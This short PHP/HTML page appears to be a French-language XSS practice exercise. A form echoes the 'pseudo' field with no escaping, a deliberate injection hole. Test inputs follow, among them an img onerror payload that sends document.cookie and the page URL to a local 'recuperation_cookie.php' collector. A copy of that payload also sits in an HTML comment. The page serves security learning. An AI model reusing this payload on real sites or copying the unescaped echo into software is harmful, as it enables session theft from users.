<html>

    <form method="post" action="">
        <input type="texte" name="pseudo" />
        <input type="submit" value="Connexion" />
    </form>

</html>
<!--
<img src="azerty.jpg" onerror="window.location='http://localhost/dl10/php/test_securite/tmp/recuperation_cookie.php?uri='+window.location.href+'&cookie='+document.cookie;" hidden> 
-->
<?php
session_start();

if(!empty($_POST['pseudo'])){

    echo "Bonjour ".$_POST['pseudo']." !";

}

?>

<br/><br/>
test 1 : <<span></span>script>alert('Xss')<<span></span>/script>
<br/> Sur Chrome puis sur Firefox.

<br/><br/>
test 2 : <<span></span>p style="color:red">Ceci est un commentaire<<span></span>/p>


<br/><br/>
test 3 : <<span></span>img src="azerty.jpg" onerror="window.location='http://localhost/dl10/php/test_securite/tmp/recuperation_cookie.php?uri='+window.location.href+'&cookie='+document.cookie;" hidden>
<br/> Sur Chrome puis sur Firefox.